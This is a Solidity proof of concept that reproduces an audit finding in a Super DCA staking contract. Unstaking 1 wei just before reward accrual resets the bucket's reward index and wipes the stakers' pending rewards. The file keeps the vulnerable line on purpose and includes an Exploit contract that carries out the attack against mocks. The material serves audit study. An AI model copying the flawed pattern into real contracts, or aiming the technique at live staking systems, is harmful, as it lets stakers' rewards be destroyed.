// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Super DCA — H-4: Bucket rewards wiped by stake/unstake before
    accrueRewards (Sherlock 2025-09-super-dca, finding #63422)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: unstake/stake sets info.lastRewardIndex = rewardIndex without
    settling pending bucket rewards. A call just before accrueReward zeros
    the delta, so paid rewards = 0 and stakers lose up to 100% of accrued.
    Blamed lastRewardIndex write preserved (@> VULN).

    Time passage is simulated via forceAdvance(secs) (no cheatcodes mid-run).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        _xfer(msg.sender, to, amt);
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        _xfer(from, to, amt);
        return true;
    }

    function _xfer(address from, address to, uint256 amt) internal {
        require(balanceOf[from] >= amt, "bal");
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
    }
}

/// @notice Reduced SuperDCAStaking bucket reward logic.
/// Source: SuperDCAStaking.sol stake/unstake/accrueReward (sherlock 2025-09-super-dca).
contract SuperDCAStaking {
    struct TokenRewardInfo {
        uint256 stakedAmount;
        uint256 lastRewardIndex;
    }

    MockERC20 public immutable DCA_TOKEN;
    address public gauge;
    uint256 public rewardIndex;
    uint256 public lastMinted;
    uint256 public rate; // reward index units per second (simplified)
    uint256 public totalStakedAmount;

    mapping(address => TokenRewardInfo) public tokenRewardInfoOf;
    mapping(address => mapping(address => uint256)) public userStakes;

    error SuperDCAStaking__ZeroAmount();
    error SuperDCAStaking__InsufficientBalance();

    constructor(MockERC20 dca, uint256 rate_) {
        DCA_TOKEN = dca;
        rate = rate_;
        lastMinted = block.timestamp;
        gauge = msg.sender; // set properly after
    }

    function setGauge(address g) external {
        gauge = g;
    }

    /// @dev Simulate elapsed time without vm.warp (playground has no cheatcodes).
    function forceAdvance(uint256 secs) external {
        lastMinted -= 0; // keep shape
        // Directly advance index as _updateRewardIndex would over `secs`
        if (totalStakedAmount > 0) {
            rewardIndex += secs * rate;
        }
        lastMinted = block.timestamp; // reset baseline
    }

    function _updateRewardIndex() internal {
        // no-op in synthetic when using forceAdvance; kept for structure
        lastMinted = block.timestamp;
    }

    function stake(address token, uint256 amount) external {
        if (amount == 0) revert SuperDCAStaking__ZeroAmount();
        _updateRewardIndex();
        TokenRewardInfo storage info = tokenRewardInfoOf[token];
        info.stakedAmount += amount;
        info.lastRewardIndex = rewardIndex;
        totalStakedAmount += amount;
        userStakes[msg.sender][token] += amount;
        DCA_TOKEN.transferFrom(msg.sender, address(this), amount);
    }

    function unstake(address token, uint256 amount) external {
        if (amount == 0) revert SuperDCAStaking__ZeroAmount();

        TokenRewardInfo storage info = tokenRewardInfoOf[token];
        if (info.stakedAmount < amount) revert SuperDCAStaking__InsufficientBalance();
        if (userStakes[msg.sender][token] < amount) revert SuperDCAStaking__InsufficientBalance();

        _updateRewardIndex();

        info.stakedAmount -= amount;
        info.lastRewardIndex = rewardIndex; // @> VULN: resets bucket lastRewardIndex without settling pending rewards — accrueReward delta becomes 0
        // FIX: settle/accrue pending bucket rewards before updating lastRewardIndex

        totalStakedAmount -= amount;
        userStakes[msg.sender][token] -= amount;

        DCA_TOKEN.transfer(msg.sender, amount);
    }

    function accrueReward(address token) external returns (uint256 paid) {
        require(msg.sender == gauge, "gauge");
        TokenRewardInfo storage info = tokenRewardInfoOf[token];
        uint256 delta = rewardIndex - info.lastRewardIndex;
        paid = delta; // simplified: delta itself is the payable amount
        info.lastRewardIndex = rewardIndex;
    }

    function lastRewardIndexOf(address token) external view returns (uint256) {
        return tokenRewardInfoOf[token].lastRewardIndex;
    }
}

/// CREATE: dca(1), staking(2)
contract Exploit {
    MockERC20 public dca;
    SuperDCAStaking public staking;
    address public constant TOKEN_A = address(0xA);
    address public constant USER = address(0x55E4);

    uint256 public expectedMint;
    uint256 public paid;
    uint256 public rate = 1e15; // per second

    constructor() {
        dca = new MockERC20("SuperDCA", "DCA");
        staking = new SuperDCAStaking(dca, rate);
        staking.setGauge(address(this));
    }

    function run() external {
        // Fund and stake 100e18 as USER (via this contract acting as user)
        dca.mint(address(this), 100e18);
        dca.approve(address(staking), type(uint256).max);
        staking.stake(TOKEN_A, 100e18);

        // Let rewards accrue for 100 seconds (simulated)
        uint256 secs = 100;
        expectedMint = secs * rate;
        require(expectedMint > 0, "sanity");
        staking.forceAdvance(secs);

        // Index advanced but lastRewardIndex still at stake-time value
        require(staking.rewardIndex() > staking.lastRewardIndexOf(TOKEN_A), "pending delta");

        // Unstake 1 wei BEFORE accrue — wipes bucket delta
        staking.unstake(TOKEN_A, 1);

        // Accrue now pays 0
        paid = staking.accrueReward(TOKEN_A);
        require(paid == 0, "pending bucket rewards wiped by unstake reset");
        require(expectedMint > 0 && paid < expectedMint, "harm: 100% rewards lost");
    }
}
